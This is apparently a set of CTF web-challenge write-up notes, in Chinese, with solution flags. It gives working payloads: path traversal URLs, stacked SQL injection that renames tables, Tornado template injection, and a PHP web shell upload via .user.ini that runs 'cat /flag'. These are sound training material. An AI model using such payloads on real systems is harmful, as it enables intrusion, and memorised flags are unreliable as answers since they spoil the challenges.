# Web

## [HCTF 2018]WarmUp

> 题解

1. http://xxx/source.php
2. http://xxx/?file=hint.php
3. http://xxx/?file=hint.php?/../../../../../ffffllllaaaagggg

> flag{534814ea-1c79-484b-8f8a-39cd858db452}

## [强网杯 2019] 随便注

> 题解

```
-1';show tables#

-1';desc `1919810931114514`#
-1';desc `words`#

# 也可以用以下方式
-1';show columns from `1919810931114514`#
-1';show columns from `words`#

# 注意，以上表名要加反引号

1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#

拆分开来如下
1';
alter table words rename to words1;
alter table `1919810931114514` rename to words;
alter table words change flag id varchar(50);
#

然后使用1' or 1=1#即可查询出flag
```

> flag{5e64f47a-c4c6-4bb8-aa8f-d422c3b582ab}

## [护网杯 2018]easy_tornado

> 题解

1. http://bfe1efae-0782-4561-aebc-24587b904e4c.node3.buuoj.cn/error?msg={{handler.settings}}
2. http://bfe1efae-0782-4561-aebc-24587b904e4c.node3.buuoj.cn/file?filename=/fllllllllllllag&filehash=370610bb5a943aa8144f39debcd0ff34

> flag{f9bd6df8-b20d-4050-8d8a-3504b196374e}

## [SUCTF 2019]EasySQL

> 题解

方法一：``*,1``
方法二：``1;set sql_mode=pipes_as_concat;select 1``

> flag{b8e3ed34-4471-4445-bc21-8a63d9c5ce78}

## [HCTF 2018]admin

> 题解

1. https://skysec.top/2018/11/12/2018-HCTF-Web-Writeup/#%E8%A7%A3%E6%B3%95%E4%B8%80%EF%BC%9Asession%E4%BC%AA%E9%80%A0

> flag{88e12012-69ea-484b-816b-13c12f3f73e7}

## [RoarCTF 2019]Easy Calc

> 题解

1. 字符串解析漏洞
2. 走私攻击
3. 参考URL：http://shangdixinxi.com/detail-1334115.html

> flag{1b7fa8ee-2302-4eff-bbaf-9bf3a80bdc4b} 

## [SUCTF 2019]Checkin

> 题解

1. 新建.user.ini

```
GIF89a
auto_prepend_file=a.jpg
```

2. vim a.jpg

```
GIF89a
<script language='php'>system("cat /flag");</script>
```
3. http:xxx/uploads/xxxx/index.php

> flag{0c504367-b082-42bb-800b-fb370af46345}

## [V&N2020 公开赛]HappyCTFd

> 题解

1. 参考https://www.colabug.com/2020/0204/6940556/amp/

> flag{4222797e-fde9-446f-8dcc-6f46f9841949}

## [V&N2020 公开赛]CHECKIN

> 题解

1. 查看代码发现打开了flag文件，并删除了，进程还存在
2. 反弹shell
3. cat /proc/*/fd/*

> flag{b829fe50-559a-4551-964c-fd146366e624}

## [v&N2020 公开赛]TimeTravel

> 题解

1. 登录BUUCTF内网linux机器
2. vim api/eligible 写入{"success": true}
3. 请求header，Proxy: http://ip:port

>  flag{eb1d22c7-61bc-4303-9f30-3f3f45cdc63e}

## [网鼎杯 2018]Fakebook

> 题解

1. https://www.cnblogs.com/xhds/p/12370281.html

> flag{fde0c56a-e05b-4df5-81f4-8dc5629fe509}

## [De1CTF 2019]SSRF Me

> 题解

1. https://xz.aliyun.com/t/5927

> flag

## [SCTF2019]Flag Shop

> 题解

1. https://www.anquanke.com/post/id/181019#h3-13
2. ruby ERB注入

> flag

## [EIS 2019]EzPOP

> 题解

1. https://www.codetd.com/en/article/8943955

> flag{655af851-539e-4c66-a23d-040fae6eefc9}